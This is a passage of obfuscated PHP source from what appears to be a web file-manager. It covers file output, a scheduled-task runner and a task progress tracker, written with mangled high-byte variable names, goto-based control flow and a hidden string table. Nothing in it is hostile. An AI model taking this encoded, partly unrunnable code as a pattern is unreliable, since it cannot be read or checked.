= $this->parse($C……­àêô); $C……­àêô = Model($D‘é½çÉ¡¤[546])->createFileName($Eë²µ¢‰»[$D‘é½çÉ¡¤[75]]); $C×°ŞØÙ³— = IO::uploadLink($C……­àêô, $d¶»îÚ˜ŒÇ); return $C×°ŞØÙ³—; } public function fileNameAuto($B‚œåÃ‡‰ß, $B¤î¶ŸÒ·Ó, $Fİìº£¼¤ = REPEAT_REPLACE, $bÆğñºÅÃ† = false) { return $this->model->fileNameAuto($B‚œåÃ‡‰ß, $B¤î¶ŸÒ·Ó, $Fİìº£¼¤, $bÆğñºÅÃ†); } public function fileNameExist($AÉÍÁíÂš”, $bÅ¡Ì¾¬ò¡) { return $this->model->fileNameExist($AÉÍÁíÂš”, $bÅ¡Ì¾¬ò¡); } protected function _fileOut($E‰Ğ¸´ì”, $f½œô™¾Õª = false, $C·½¥«Æ“Ÿ = false, $c¥¤½µÒ‡ = '', $dõºœºŒñ = false) { goto AÈàÔØ¼××; Fç…Ğ«Í§“: $Aæ¼œ¼²çÏ = $this->model->fileInfoGet($E‰Ğ¸´ì”); $c¥¤½µÒ‡ = $Aæ¼œ¼²çÏ[$f—°ÔªÄÓë[163]] ? $Aæ¼œ¼²çÏ[$f—°ÔªÄÓë[163]] : $c¥¤½µÒ‡; $eòëŠÃßŒ  = isset($GLOBALS[$f—°ÔªÄÓë[1125]]) ? $GLOBALS[$f—°ÔªÄÓë[1125]] : $DŞ¶¡íˆ‘…[$f—°ÔªÄÓë[28]]; goto C‘ö¨Û²¯¤; C‘ö¨Û²¯¤: if ($dõºœºŒñ) { return IO::fileOutServer($Aæ¼œ¼²çÏ[$f—°ÔªÄÓë[75]], $f½œô™¾Õª, $eòëŠÃßŒ , $c¥¤½µÒ‡); } IO::fileOut($Aæ¼œ¼²çÏ[$f—°ÔªÄÓë[75]], $f½œô™¾Õª, $eòëŠÃßŒ , $c¥¤½µÒ‡); goto FæØ„±Èõ; AÈàÔØ¼××: $f—°ÔªÄÓë =& $_SERVER[´Ù×Íå‘ÄõÛ]; $DŞ¶¡íˆ‘… = $this->model->sourceInfo($E‰Ğ¸´ì”); if ($DŞ¶¡íˆ‘…[$f—°ÔªÄÓë[370]] == $f—°ÔªÄÓë[83]) { header($f—°ÔªÄÓë[1124]); die; } goto Fç…Ğ«Í§“; FæØ„±Èõ: } public function fileOut($Aªõª‘ÁŒ˜, $B‘Ò†ÒƒŸò = false, $D¾Œò­é¢Í = false, $BÕÓî¹¹Ú– = '') { $this->_fileOut($Aªõª‘ÁŒ˜, $B‘Ò†ÒƒŸò, $D¾Œò­é¢Í, $BÕÓî¹¹Ú–); } public function fileOutServer($EĞ½òí¥İó, $Dî‚ÃöÁÁï = false, $A‹´„Æã¡ = false, $F‰Ó±°Ò»¤ = '') { $this->_fileOut($EĞ½òí¥İó, $Dî‚ÃöÁÁï, $A‹´„Æã¡, $F‰Ó±°Ò»¤, !0); } protected function _fileOutImage($BÈ»µº÷ˆŞ, $dÊñˆÊÒçà = 250) { $c‡¶¤ÜÕÆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b¶µ“ëö²Ø = $this->model->sourceInfo($BÈ»µº÷ˆŞ); if ($b¶µ“ëö²Ø[$c‡¶¤ÜÕÆ[370]] == $c‡¶¤ÜÕÆ[83]) { show_json($c‡¶¤ÜÕÆ[1126] . $BÈ»µº÷ˆŞ, !1); } $GLOBALS[$c‡¶¤ÜÕÆ[1125]] = $b¶µ“ëö²Ø[$c‡¶¤ÜÕÆ[28]]; $d™¼”À›ªä = $this->model->fileInfoGet($BÈ»µº÷ˆŞ); IO::fileOutImage($d™¼”À›ªä[$c‡¶¤ÜÕÆ[75]], $dÊñˆÊÒçà); } public function fileOutImage($C¢Û¼øªèø, $BØ»”Ï ¡ô = 250) { $this->_fileOutImage($C¢Û¼øªèø, $BØ»”Ï ¡ô); } public function fileOutImageServer($f›¨ò‰Ò, $DÔ¼¾ÎĞ¹ = 250) { $this->_fileOutImage($f›¨ò‰Ò, $DÔ¼¾ÎĞ¹); } public function link($d·’‘—×¤Ÿ, $D›‚ß©Õõ = '') { $FÌ‡½†Ù°ß = $this->model->fileInfoGet($d·’‘—×¤Ÿ); return IO::link($FÌ‡½†Ù°ß[$_SERVER[´Ù×Íå‘ÄõÛ][75]], $D›‚ß©Õõ); } protected function parse($AÁ‰Ù½”‰¾) { $EÎ¾“ßõ° =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (strstr($AÁ‰Ù½”‰¾, $EÎ¾“ßõ°[8]) === !1) { return array($EÎ¾“ßõ°[385] => intval($AÁ‰Ù½”‰¾), $EÎ¾“ßõ°[75] => $EÎ¾“ßõ°[33], $EÎ¾“ßõ°[1122] => array()); } $cÕªå±¶¿ = explode($EÎ¾“ßõ°[8], trim($AÁ‰Ù½”‰¾, $EÎ¾“ßõ°[8])); if (count($cÕªå±¶¿) < 2) { show_tips($AÁ‰Ù½”‰¾ . $EÎ¾“ßõ°[1127]); } return array($EÎ¾“ßõ°[385] => intval($cÕªå±¶¿[0]), $EÎ¾“ßõ°[75] => $cÕªå±¶¿[1], $EÎ¾“ßõ°[1122] => array_slice($cÕªå±¶¿, 1)); } } goto Fã¢¯’¬¤°; e¼¯ä×–à: class AutoTask { public static function start() { goto EƒÌ†·Ø«•; e·‹‘„­˜µ: while (!0) { self::cacheClear(); if (self::valueGet($DËÁõÈÜØÙ[690]) != $DËÁõÈÜØÙ[83]) { self::valueSet($DËÁõÈÜØÙ[1405], $DËÁõÈÜØÙ[470]); self::log($DËÁõÈÜØÙ[1409]); die; } self::valueSet($DËÁõÈÜØÙ[1405], $DËÁõÈÜØÙ[83]); self::valueSet($DËÁõÈÜØÙ[1406], time()); self::taskRunAll(); sleep(self::valueGet($DËÁõÈÜØÙ[1410])); } goto dƒ´ÂŞ¾»…; f¾†ÃÑ±¬¤: http_close(); self::valueSet($DËÁõÈÜØÙ[1405], $DËÁõÈÜØÙ[83]); Hook::bind($DËÁõÈÜØÙ[1407], $DËÁõÈÜØÙ[1408]); goto e·‹‘„­˜µ; EƒÌ†·Ø«•: $DËÁõÈÜØÙ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (self::valueGet($DËÁõÈÜØÙ[690]) != $DËÁõÈÜØÙ[83]) { return; } if (self::valueGet($DËÁõÈÜØÙ[1405]) == $DËÁõÈÜØÙ[83]) { $a°İ‹ƒƒ´‹ = self::valueGet($DËÁõÈÜØÙ[1406]); if (time() - $a°İ‹ƒƒ´‹ > 3600 * 2) { self::restart(); } return; } goto f¾†ÃÑ±¬¤; dƒ´ÂŞ¾»…: } public static function restart() { $F¯Ğ‚‰ç¹º =& $_SERVER[´Ù×Íå‘ÄõÛ]; http_close(); self::valueSet($F¯Ğ‚‰ç¹º[690], $F¯Ğ‚‰ç¹º[470]); sleep(self::valueGet($F¯Ğ‚‰ç¹º[1410]) + 5); self::valueSet($F¯Ğ‚‰ç¹º[1405], $F¯Ğ‚‰ç¹º[470]); self::valueSet($F¯Ğ‚‰ç¹º[690], $F¯Ğ‚‰ç¹º[83]); } public static function shutdownEvent() { $a¡ÅŞøÛÒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; self::valueSet($a¡ÅŞøÛÒ[1405], $a¡ÅŞøÛÒ[470]); self::log($a¡ÅŞøÛÒ[1411]); } public static function config($fÅšòõ‰ÆØ, $d– ¢¥–„Ô) { $dÃĞøˆ¾Ø† =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a˜ĞàÙƒø  = 20; $d– ¢¥–„Ô = intval($d– ¢¥–„Ô) <= $a˜ĞàÙƒø  ? $a˜ĞàÙƒø  : intval($d– ¢¥–„Ô); self::valueSet($dÃĞøˆ¾Ø†[690], $fÅšòõ‰ÆØ); self::valueSet($dÃĞøˆ¾Ø†[1410], $d– ¢¥–„Ô); } private static function taskRunAll() { $EÀÔ©Â”Ã =& $_SERVER[´Ù×Íå‘ÄõÛ]; $båªø§Çä = Model($EÀÔ©Â”Ã[1412])->listData(); $fÖ‰êËÄ = count($båªø§Çä); for ($E¢‰‡¢³¨¦ = 0; $E¢‰‡¢³¨¦ < $fÖ‰êËÄ; $E¢‰‡¢³¨¦++) { $fµ¦çÆóŒŠ = $båªø§Çä[$E¢‰‡¢³¨¦]; if ($fµ¦çÆóŒŠ[$EÀÔ©Â”Ã[1413]] != $EÀÔ©Â”Ã[83]) { continue; } if (!self::taskTimeCheck($fµ¦çÆóŒŠ)) { continue; } self::taskRun($fµ¦çÆóŒŠ); } Hook::trigger($EÀÔ©Â”Ã[1414]); } private static function taskTimeCheck($E¸ŸÓ¤ãÂå) { goto EõÉÇ×Ø»; d‘¬Ã®…›ù: switch ($FŒïõâƒ†¾[$aš”÷™‰ƒ„[29]]) { case $aš”÷™‰ƒ„[1421]: if (time() - $CãŸ‹Œ›‡ê < 3600 * 24 * 30) { return !1; } if ($FŒïõâƒ†¾[$aš”÷™‰ƒ„[1421]] == date($aš”÷™‰ƒ„[1422]) && $e£ĞÈ‚Ìˆ) { return !0; } break; case $aš”÷™‰ƒ„[1423]: if (time() - $CãŸ‹Œ›‡ê < 3600 * 24 * 7) { return !1; } $Eˆğ”¡¢ = date($aš”÷™‰ƒ„[1424]) == 0 ? 7 : date($aš”÷™‰ƒ„[1424]); if ($FŒïõâƒ†¾[$aš”÷™‰ƒ„[1423]] == $Eˆğ”¡¢ && $e£ĞÈ‚Ìˆ) { return !0; } break; case $aš”÷™‰ƒ„[1416]: if (time() - $CãŸ‹Œ›‡ê < 3600 * 24) { return !1; } if ($e£ĞÈ‚Ìˆ) { return !0; } break; case $aš”÷™‰ƒ„[1425]: if (time() - $CãŸ‹Œ›‡ê >= floatval($FŒïõâƒ†¾[$aš”÷™‰ƒ„[1425]]) * 60) { return !0; } break; default: break; } return !1; goto EÂ²ìĞ¹„ö; BäîÉŸÖ¤İ: $A¡õ˜íİ¾ò = strtotime($aš”÷™‰ƒ„[1415] . $FŒïõâƒ†¾[$aš”÷™‰ƒ„[1416]] . $aš”÷™‰ƒ„[1417]) - strtotime($aš”÷™‰ƒ„[1418]); $FÕ¢Ñ¾®‘„ = time() - strtotime(date($aš”÷™‰ƒ„[1419]) . $aš”÷™‰ƒ„[1420]); $e£ĞÈ‚Ìˆ = $FÕ¢Ñ¾®‘„ >= $A¡õ˜íİ¾ò && $FÕ¢Ñ¾®‘„ <= $A¡õ˜íİ¾ò + 3600; goto d‘¬Ã®…›ù; EõÉÇ×Ø»: $aš”÷™‰ƒ„ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FŒïõâƒ†¾ = json_decode($E¸ŸÓ¤ãÂå[$aš”÷™‰ƒ„[190]], !0); $CãŸ‹Œ›‡ê = intval($E¸ŸÓ¤ãÂå[$aš”÷™‰ƒ„[1406]]); goto BäîÉŸÖ¤İ; EÂ²ìĞ¹„ö: } public static function taskRun($CØ‚‘ ˆàë) { goto cóçÏ‘›Ó; Aİ‚…Ê§çƒ: Model($EÕˆ‹ˆ•°™[1430])->add(array($EÕˆ‹ˆ•°™[1431] => $EÕˆ‹ˆ•°™[33], $EÕˆ‹ˆ•°™[1432] => $EÕˆ‹ˆ•°™[470], $EÕˆ‹ˆ•°™[29] => $EÕˆ‹ˆ•°™[1433] . $CØ‚‘ ˆàë[$EÕˆ‹ˆ•°™[367]], $EÕˆ‹ˆ•°™[1434] => json_encode(array($EÕˆ‹ˆ•°™[28] => $CØ‚‘ ˆàë[$EÕˆ‹ˆ•°™[28]], $EÕˆ‹ˆ•°™[1435] => timeFloat() - $CÂŠñ²ˆØ, $EÕˆ‹ˆ•°™[281] => $e°®„§Úùí)))); self::log($EÕˆ‹ˆ•°™[1436] . $CØ‚‘ ˆàë[$EÕˆ‹ˆ•°™[367]] . $EÕˆ‹ˆ•°™[1437] . $e°®„§Úùí); return !0; goto EÆË‚Ùñ²; cóçÏ‘›Ó: $EÕˆ‹ˆ•°™ =& $_SERVER[´Ù×Íå‘ÄõÛ]; self::log($EÕˆ‹ˆ•°™[1426] . $CØ‚‘ ˆàë[$EÕˆ‹ˆ•°™[367]] . $EÕˆ‹ˆ•°™[1427] . $CØ‚‘ ˆàë[$EÕˆ‹ˆ•°™[28]] . $EÕˆ‹ˆ•°™[1428] . $CØ‚‘ ˆàë[$EÕˆ‹ˆ•°™[1429]]); Model($EÕˆ‹ˆ•°™[1412])->run($CØ‚‘ ˆàë[$EÕˆ‹ˆ•°™[367]]); goto d†ğĞ‰í½‚; d†ğĞ‰í½‚: $CÂŠñ²ˆØ = timeFloat(); $e°®„§Úùí = $EÕˆ‹ˆ•°™[33]; switch ($CØ‚‘ ˆàë[$EÕˆ‹ˆ•°™[29]]) { case $EÕˆ‹ˆ•°™[295]: $Fğ¡ˆóÎàÑ = url_request($CØ‚‘ ˆàë[$EÕˆ‹ˆ•°™[1429]], $EÕˆ‹ˆ•°™[216], !1, !1, !1, !1, 5); $e°®„§Úùí = strlen($Fğ¡ˆóÎàÑ); break; case $EÕˆ‹ˆ•°™[215]: $e°®„§Úùí = Hook::apply($CØ‚‘ ˆàë[$EÕˆ‹ˆ•°™[1429]]); default: break; } goto Aİ‚…Ê§çƒ; EÆË‚Ùñ²: } private static function valueGet($a¦¢ƒ¥ò†÷) { $bÅŒÜ¼Šâ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A’°¾¬«• = $bÅŒÜ¼Šâ[1438]; $f‚šİ—˜ˆ = Model($bÅŒÜ¼Šâ[1439])->get($a¦¢ƒ¥ò†÷, $A’°¾¬«•); if (is_null($f‚šİ—˜ˆ)) { Model($bÅŒÜ¼Šâ[1439])->set($bÅŒÜ¼Šâ[1410], 10, $A’°¾¬«•); Model($bÅŒÜ¼Šâ[1439])->set($bÅŒÜ¼Šâ[690], $bÅŒÜ¼Šâ[83], $A’°¾¬«•); Model($bÅŒÜ¼Šâ[1439])->set($bÅŒÜ¼Šâ[1405], $bÅŒÜ¼Šâ[470], $A’°¾¬«•); $f‚šİ—˜ˆ = Model($bÅŒÜ¼Šâ[1439])->get($a¦¢ƒ¥ò†÷, $A’°¾¬«•); } return $f‚šİ—˜ˆ; } private static function valueSet($eØÉñ¬Üë, $DÀ…µ‘£°—) { $dí¹øÇøš =& $_SERVER[´Ù×Íå‘ÄõÛ]; return Model($dí¹øÇøš[1439])->set($eØÉñ¬Üë, $DÀ…µ‘£°—, $dí¹øÇøš[1438]); } protected static function log($D—“©ÎŞÈĞ) { write_log($D—“©ÎŞÈĞ, $_SERVER[´Ù×Íå‘ÄõÛ][1440]); } private static function cacheClear() { $DÁ¶‡£ÕÙì =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A®Ê·Ñ—Ú± = Model($DÁ¶‡£ÕÙì[1439])->cacheKey($DÁ¶‡£ÕÙì[1438]); Cache::clearMemory($A®Ê·Ñ—Ú±); Model($DÁ¶‡£ÕÙì[1412])->cacheClear(); } } class Task { const STATYS_STOP = "\163\x74\x6f\x70"; const STATYS_RUNNING = "\162\165\x6e\156\x69\x6e\x67"; const STATYS_KILL = "\x6b\x69\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($a‰ÀÙ©îæ‹, $BôõÓëğãÙ = '', $eè…¯¬«‚» = 0, $cÚ©‘›Ñó = '') { goto EæÖîÆÜ¥Ï; Bâë²Õ„ä: Hook::bind($BˆùõÅÕÃÖ[1407], array($this, $BˆùõÅÕÃÖ[1449])); Hook::bind($BˆùõÅÕÃÖ[1450], array($this, $BˆùõÅÕÃÖ[1451])); $this->startAfter(); goto cÀºô÷÷ôù; EæÖîÆÜ¥Ï: $BˆùõÅÕÃÖ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (self::get($a‰ÀÙ©îæ‹)) { return; } $this->task = array($BˆùõÅÕÃÖ[367] => $a‰ÀÙ©îæ‹, $BˆùõÅÕÃÖ[1441] => USER_ID, $BˆùõÅÕÃÖ[1347] => $cÚ©‘›Ñó, $BˆùõÅÕÃÖ[29] => $BôõÓëğãÙ, $BˆùõÅÕÃÖ[982] => $BˆùõÅÕÃÖ[33], $BˆùõÅÕÃÖ[980] => $eè…¯¬«‚», $BˆùõÅÕÃÖ[994] => 0, $BˆùõÅÕÃÖ[1442] => 0, $BˆùõÅÕÃÖ[1443] => 0, $BˆùõÅÕÃÖ[1444] => timeFloat(), $BˆùõÅÕÃÖ[1445] => 0, $BˆùõÅÕÃÖ[1446] => 0, $BˆùõÅÕÃÖ[1447] => 0, $BˆùõÅÕÃÖ[1448] => 0, $BˆùõÅÕÃÖ[690] => $BˆùõÅÕÃÖ[1405]); goto Bâë²Õ„ä; cÀºô÷÷ôù: Hook::trigger($BˆùõÅÕÃÖ[1452], $this->task); $this->task[$BˆùõÅÕÃÖ[1446]] = timeFloat(); goto Fƒí›®‡ä§; Fƒí›®‡ä§: } public function end() { goto AÒ‰İ‚íäÛ; AÒ‰İ‚íäÛ: $fÀÒŒÁ¬ Œ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->task) { return; } if ($this->task[$fÀÒŒÁ¬ Œ[1446]]) { self::valueSet($this->task[$fÀÒŒÁ¬ Œ[367]], !1); } goto DšÀÍèåê; bŞ„¿¥•¬Ç: Hook::unbind($fÀÒŒÁ¬ Œ[1450], array($this, $fÀÒŒÁ¬ Œ[1451])); $this->endAfter(); $this->task = !1; goto c´ºí††‡ª; DšÀÍèåê: $eÙøõÉµ¬Ù = timeFloat() - $this->task[$fÀÒŒÁ¬ Œ[1444]]; self::log($fÀÒŒÁ¬ Œ[1453] . $this->task[$fÀÒŒÁ¬ Œ[367]] . $fÀÒŒÁ¬ Œ[1454] . $eÙøõÉµ¬Ù . $fÀÒŒÁ¬ Œ[1455]); Hook::unbind($fÀÒŒÁ¬ Œ[1407], array($this, $fÀÒŒÁ¬ Œ[1449])); goto bŞ„¿¥•¬Ç; c´ºí††‡ª: } public function update($f¹Íä™‘‚ = 0) { goto bÌªÅé£™‘; bÌªÅé£™‘: $eßÓ¶‘×ã =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c¥½ƒ‰¢‚ =& $this->task; if (!$c¥½ƒ‰¢‚) { return; } goto A¼¯Ï„”æó; c·ÂÅè¥ğ‹: Hook::trigger($eßÓ¶‘×ã[1459], $c¥½ƒ‰¢‚); self::valueSet($c¥½ƒ‰¢‚[$eßÓ¶‘×ã[367]], $c¥½ƒ‰¢‚); goto BíâÜÔò¤; A¼¯Ï„”æó: $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[994]] += $f¹Íä™‘‚; $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[1445]] = timeFloat(); if ($c¥½ƒ‰¢‚[$eßÓ¶‘×ã[980]]) { if ($c¥½ƒ‰¢‚[$eßÓ¶‘×ã[980]] < $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[994]]) { $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[980]] = $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[994]]; } $F©œùÍÃ¯Ã = timeFloat() - $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[1444]] - $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[1447]]; $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[1442]] = $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[994]] / $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[980]]; $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[1443]] = $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[994]] / $F©œùÍÃ¯Ã; if ($c¥½ƒ‰¢‚[$eßÓ¶‘×ã[1442]] > 0) { $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[1448]] = $F©œùÍÃ¯Ã * (1 - $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[1442]]) / $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[1442]]; } $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[1448]] = $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[1448]] <= 0 ? 0 : $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[1448]]; } goto D¬²ØÜŞå; E¯´ïôÉ: $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[690]] = $E„ÉÚê±±æ ? $E„ÉÚê±±æ : $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[690]]; $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[1447]] = $a‡¤èè¨×Ö[$eßÓ¶‘×ã[1447]] ? $a‡¤èè¨×Ö[$eßÓ¶‘×ã[1447]] : 0; $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[1446]] = timeFloat(); goto c·ÂÅè¥ğ‹; D¬²ØÜŞå: $this->updateAfter(); $Eè•¶Ù¡ = 0.2; if (timeFloat() - $c¥½ƒ‰¢‚[$eßÓ¶‘×ã[1446]] < $Eè•¶Ù¡) { return; } goto F˜Ë‹Èã¡; F˜Ë‹Èã¡: $a‡¤èè¨×Ö = self::get($c¥½ƒ‰¢‚[$eßÓ¶‘×ã[367]]); $E„ÉÚê±±æ = $a‡¤èè¨×Ö[$eßÓ¶‘×ã[690]]; if ($E„ÉÚê±±æ == self::STATYS_KILL) { $fˆò· ›Ë = array($eßÓ¶‘×ã[1456] => LNG($eßÓ¶‘×ã[1457]), $eßÓ¶‘×ã[1036] => !1); Cache::set($eßÓ¶‘×ã[1458] . $this->task[$eßÓ¶‘×ã[367]], $fˆò· ›Ë, 30); $this->end(); die; } else { if ($E„ÉÚê±±æ == self::STATYS_STOP) { $d‚¿†³ëºË = 2; $a‡¤èè¨×Ö[$eßÓ¶‘×ã[1447]] += $d‚¿†³ëºË; self::valueSet($c¥½ƒ‰¢‚[$eßÓ¶‘×ã[367]], $a‡¤èè¨×Ö); sleep($d‚¿†³ëºË); $this->update(); return; } } goto E¯´ïôÉ; BíâÜÔò¤: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($AåÓœ°ˆš¢) { $Dâ˜Ü¼ÑÅ‚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; Cache::set($Dâ˜Ü¼ÑÅ‚[1458] . $this->task[$Dâ˜Ü¼ÑÅ‚[367]], $AåÓœ°ˆš¢, 60); return $AåÓœ°ˆš¢; } public static function get($cÂ†Ú¤Õß) { return self::valueGet($cÂ†Ú¤Õß); } public static function listData() { $D¨Õê…Äã = self::valueGet(); return array_sort_by($D¨Õê…Äã, $_SERVER[´Ù×Íå‘ÄõÛ][1444], !0); } public static function kill($C’Ò¯‘æ) { return self::changeStatus($C’Ò¯‘æ, self::STATYS_KILL); } public static function stop($eìÁ™å÷Á„) { return self::changeStatus($eìÁ™å÷Á„, self::STATYS_STOP); } public static function restart($DÄõÏë‡¶ô) { return self::changeStatus($DÄõÏë‡¶ô, self::STATYS_RUNNING); } public static function killAll() { $E„àÙˆŒ¦ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cÕöª›óìÜ = self::listData(); foreach ($cÕöª›óìÜ as $CÄ©ç„½Ü) { self::kill($CÄ©ç„½Ü[$E„àÙˆŒ¦[367]]); } sleep(2); foreach ($cÕöª›óìÜ as $CÄ©ç„½Ü) { self::valueSet($CÄ©ç„½Ü[$E„àÙˆŒ¦[367]], !1); } } private static function changeStatus($Dğ“àÑ—£Æ, $a¼‘Ú¨¸å) { goto b‡Î‡„‹¬Õ; Fˆà²å˜: $Fğù„ê¬±Ï[$fÌ‚œôäñ±[690]] = $a¼‘Ú¨¸å; self::valueSet($Dğ“àÑ—£Æ, $Fğù„ê¬±Ï); self::log($fÌ‚œôäñ±[1460] . $Fğù„ê¬±Ï[$fÌ‚œôäñ±[367]] . $fÌ‚œôäñ±[1461] . $a¼‘Ú¨¸å); goto c˜§ÅÅ“–á; c˜§ÅÅ“–á: return !0; goto bñğ‹Ú¡ÌÓ; b‡Î‡„‹¬Õ: $fÌ‚œôäñ± =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Fğù„ê¬±Ï = self::valueGet($Dğ“àÑ—£Æ); if (!$Fğù„ê¬±Ï) { return !1; } goto Fˆà²å˜; bñğ‹Ú¡ÌÓ: } public static function valueGet($E†äºØ… = false) { $Fƒ™ğĞğ…¯ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($E†äºØ…) { $CğÓŞİ‹Ëç = Model($Fƒ™ğĞğ…¯[399])->where(array($Fƒ™ğĞğ…¯[89] => $E†äºØ…, $Fƒ™ğĞğ…¯[29] => $Fƒ™ğĞğ…¯[1462]))->find(); return $CğÓŞİ‹Ëç ? json_decode($CğÓŞİ‹Ëç[$Fƒ™ğĞğ…¯[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($E¤¢êÅ‚´ = false) { goto BäöÑŠöÍ; bÎÃºÀç†: return $DÉ‰ë’Åª¿; goto DŞŒ®Ï†ãí; bÀÃˆ˜¬ï: $DÉ‰ë’Åª¿ = Model($aŸ×â‹¤à­[399])->where($fïª½âë²­)->select(); $DÉ‰ë’Åª¿ = $DÉ‰ë’Åª¿ ? $DÉ‰ë’Åª¿ : array(); foreach ($DÉ‰ë’Åª¿ as $Eğã»÷® => $aãŒº³ÄØƒ) { $DÉ‰ë’Åª¿[$Eğã»÷®] = json_decode($aãŒº³ÄØƒ[$aŸ×â‹¤à­[359]], !0); } goto bÎÃºÀç†; BäöÑŠöÍ: $aŸ×â‹¤à­ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fïª½âë²­ = array($aŸ×â‹¤à­[29] => $aŸ×â‹¤à­[1462]); if ($E¤¢êÅ‚´) { $fïª½âë²­[$aŸ×â‹¤à­[1441]] = $E¤¢êÅ‚´; } goto bÀÃˆ˜¬ï; DŞŒ®Ï†ãí: } public static function valueSet($d‰²Ñ¨¹ğ, $e“…Ü“šÑï) { goto cƒÈ²Š°²; cƒÈ²Š°²: $f§—¤¨Œ”™ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$e“…Ü“šÑï) { return Model($f§—¤¨Œ”™[399])->where(array($f§—¤¨Œ”™[89] => $d‰²Ñ¨¹ğ, $f§—¤¨Œ”™[29] => $f§—¤¨Œ”™[1462]))->delete(); } $c×‡Ğ§²¤Í = json_encode($e“…Ü“šÑï); goto DÆæéÖ¨‹; DÆæéÖ¨‹: if (!$c×‡Ğ§²¤Í) { ob_start(); var_dump($e“…Ü“šÑï); $Eß’œÇÁ© = ob_get_clean(); self::log($f§—¤¨Œ”™[1463] . json_encode_force($Eß’œÇÁ©)); } if (!$d‰²Ñ¨¹ğ || !$e“…Ü“šÑï[$f§—¤¨Œ”™[367]]) { return !1; } $A¢¶É®‚Û… = array($f§—¤¨Œ”™[29] => $f§—¤¨Œ”™[1462], $f§—¤¨Œ”™[1441] => USER_ID, $f§—¤¨Œ”™[89] => $d‰²Ñ¨¹ğ, $f§—¤¨Œ”™[359] => $c×‡Ğ§²¤Í); goto CÙ±ìÔ¥î®; CÙ±ìÔ¥î®: Model($f§—¤¨Œ”™[399])->add($A¢¶É®‚Û…, array(), !0); goto C¾¯·À£¬; C¾¯·À£¬: } public static function log($D¯´¹ëæ„æ) { write_log($D¯´¹ëæ„æ, $_SERVER[´Ù×Íå‘ÄõÛ][1464]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto e¥ô‚ÅÜ†Â; AäÏ±Ï¨±à: $e×¬ÎÙì©Û[$C›éàæ™…Ò[1490]] = 0; $e×¬ÎÙì©Û[$C›éàæ™…Ò[1491]] = 0; if (!$e×¬ÎÙì©Û[$C›éàæ™…Ò[1347]]) { $e×¬ÎÙì©Û[$C›éàæ™…Ò[1347]] = LNG($C›éàæ™…Ò[1492]); } goto Eí“èÊ™ò…; Aöª¢Ã²ˆ: $e×¬ÎÙì©Û[$C›éàæ™…Ò[982]] = $C›éàæ™…Ò[33]; $e×¬ÎÙì©Û[$C›éàæ™…Ò[1488]] = $C›éàæ™…Ò[33]; $e×¬ÎÙì©Û[$C›éàæ™…Ò[1489]] = 0; goto AäÏ±Ï¨±à; EæÈ›šÜ²ç: Hook::bind($C›éàæ™…Ò[541], array($this, $C›éàæ™…Ò[1471])); Hook::bind($C›éàæ™…Ò[542], array($this, $C›éàæ™…Ò[1472])); Hook::bind($C›éàæ™…Ò[544], array($this, $C›éàæ™…Ò[1473])); goto e­°áÏçÌÊ; EÆ™ä®ôäá: Hook::bind($C›éàæ™…Ò[1475], array($this, $C›éàæ™…Ò[1476])); Hook::bind($C›éàæ™…Ò[534], array($this, $C›éàæ™…Ò[1477])); $this->sourceModelCopyFlag = !1; goto e¢ïá«¯¨¢; e­°áÏçÌÊ: Hook::bind($C›éàæ™…Ò[545], array($this, $C›éàæ™…Ò[1473])); Hook::bind($C›éàæ™…Ò[511], array($this, $C›éàæ™…Ò[1474])); Hook::bind($C›éàæ™…Ò[508], array($this, $C›éàæ™…Ò[1474])); goto Dª…Ü†›ŒÇ; Dª…Ü†›ŒÇ: Hook::bind($C›éàæ™…Ò[513], array($this, $C›éàæ™…Ò[1474])); Hook::bind($C›éàæ™…Ò[515], array($this, $C›éàæ™…Ò[1474])); Hook::bind($C›éàæ™…Ò[517], array($this, $C›éàæ™…Ò[1474])); goto EÆ™ä®ôäá; c§‡ÚŒÌ‰‘: Hook::bind($C›éàæ™…Ò[1465], array($this, $C›éàæ™…Ò[1466])); Hook::bind($C›éàæ™…Ò[1467], array($this, $C›éàæ™…Ò[1468])); Hook::bind($C›éàæ™…Ò[1469], array($this, $C›éàæ™…Ò[1470])); goto EæÈ›šÜ²ç; e¢ïá«¯¨¢: Hook::bind($C›éàæ™…Ò[1478], array($this, $C›éàæ™…Ò[1479])); Hook::bind($C›éàæ™…Ò[1480], array($this, $C›éàæ™…Ò[1481])); 